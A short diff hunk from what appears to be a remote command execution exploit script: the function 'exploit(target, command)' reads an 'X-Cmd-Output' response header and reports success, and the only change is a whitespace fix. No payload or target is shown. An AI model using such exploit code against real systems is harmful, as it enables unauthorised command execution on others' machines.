@@ -78,7 +78,7 @@ def exploit(target, command):
             timeout=15,
             verify=False,
         )
-        
+
         output = r.headers.get("X-Cmd-Output")
         if output:
             print("[+] Command executed successfully!")
